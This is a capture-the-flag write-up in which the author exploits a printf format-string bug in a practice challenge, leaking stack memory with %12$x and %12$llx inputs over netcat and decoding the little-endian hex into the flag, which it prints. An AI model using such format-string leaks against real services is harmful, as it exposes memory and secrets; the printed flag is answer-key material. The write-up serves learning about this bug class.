# Archive

Having escaped the Xenithians, you now stand before a cryptic Xenithian archive. Retrieve the book of secrets from the archive!

`nc uithack.td.org.uit.no 9002`

[⬇️ archive.c](./archive.c) [⬇️ archive](./archive)

# Writeup

On this there seems to be a `printf` call without any validation of my input. The flag is stored in the memory right before it prints whatever I write. So I can use the `%x` to leak one byte of the memory. I started by locating where it is by running it locally on my pc. Filling `flag.txt` with `A`'s and then running the program with `./archive` with `%<num>$x` until I got it. I was planning to script it but only after 12 attempts I found it:

```bash
$ ./archive 
What book do you want to read?
%12$x
41414141
```

There are my `A`s. Happy with that I connected and fetched it from their sercer:

```bash
$ nc uithack.td.org.uit.no 9002
What book do you want to read?
%12$x %13$x %14$x %15$x %16$x
48546955 33687b34 31686372 0 0
```

Something was off. Using [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=NDg1NDY5NTUgMzM2ODdiMzQgMzE2ODYzNzI) I converted the hex to ascii and got `HTiU3h{41hcr`. Understandable these used little endianess so the first one is 4 characters `UiTH` but the second one makes no sense. I tried so many times and made a script to take the  first 100 places and convert them to ascii. I got nothing.

I then found a link to [CTF>101](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/) which shows me the `llx` format. I tried that and got the flag:

```bash 
$ nc uithack.td.org.uit.no 9002
What book do you want to read?
%12$llx %13$llx %14$llx %15$llx %16$llx
326b636148546955 345f617833687b34 7d73657631686372 %
```

I now had a more believable number of characters `2kcaHTiU4_ax3h{4}sev1hcr` so with a reverse and a few manual changes I got the flag:

```javascript
"2kcaHTiU4_ax3h{4}sev1hcr" => reverse
"rch1ves}4{h3xa_4UiTHack2" => shuffle around
"UiTHack24{h3xa_4rch1ves}" == flag
```